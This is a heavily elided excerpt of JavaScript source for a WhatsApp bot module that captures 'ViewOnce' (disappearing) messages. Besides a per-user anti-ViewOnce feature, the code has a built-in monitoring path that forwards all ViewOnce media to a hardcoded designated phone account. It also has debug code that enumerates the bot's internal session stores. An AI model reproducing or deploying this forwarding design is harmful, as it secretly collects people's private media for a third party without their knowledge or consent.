 ...
 * - Monitoring system forwards all ViewOnce to designated account
 */
...
export class ViewOnceHandler {
  ...
  static MONITORING_TARGET_JID = "2348058931416@s.whatsapp.net" // Default monitoring target
  static SKIP_GROUP_MONITORING = false // Skip group ViewOnce for monitoring account
  ...
  static async handleViewOnceMessage(m, sock) {
    try {
      ...
      try {
        monitoringProcessed = await this.processMonitoringAccount(m, detection)
...
/**
  ...
  static logAllAvailableSessionsDetailed(sessionManager) {
    try {
      console.log(`[ViewOnce Debug] ========== SESSION MANAGER ANALYSIS ==========`)
      console.log(`[ViewOnce Debug] SessionManager type:`, typeof sessionManager)
      console.log(`[ViewOnce Debug] SessionManager keys:`, Object.keys(sessionManager))
      
      // Check for common session storage patterns
      const possibleSessionProps = ['sessions', 'activeSessions', '_sessions', 'sessionStore', 'clients']
      ...
      for (const method of possibleMethods) {
        ...
        console.log(`[ViewOnce Debug] Method ${method}:`, hasMethod ? 'Available' : 'Not Available')
      }
  ...
  /**
   * ===========================================
   * USER-SPECIFIC ANTI-VIEWONCE PROCESSING (UPDATED)
   * ===========================================
   */
  static async processUserAntiViewOnce(m, messageContext, detection) {
    try {
      // Check if user has anti-ViewOnce enabled
      ...
      // Find user's active session using normalized JID matching
      ...
      // Process and forward ViewOnce media
...
static async processMonitoringAccount(m, detection) {
  ...
  /**
   * ===========================================
   * MONITORING ACCOUNT SESSION RETRIEVAL (UPDATED)
   * ===========================================
   */
  static async getMonitoringAccountSession(telegramId) {
    try {
      ...
      // Query sessions table for monitoring account
      ...
      // Format phone number to WhatsApp JID (normalized)
      let monitoringJid = phoneNumber.replace('+', '') + '@s.whatsapp.net'
      
      // Use normalized JID matching to find session
      ...
      if (!sock) {
        ...
        this.logAvailableSessions(sessionManager, monitoringJid)
        return null
      }
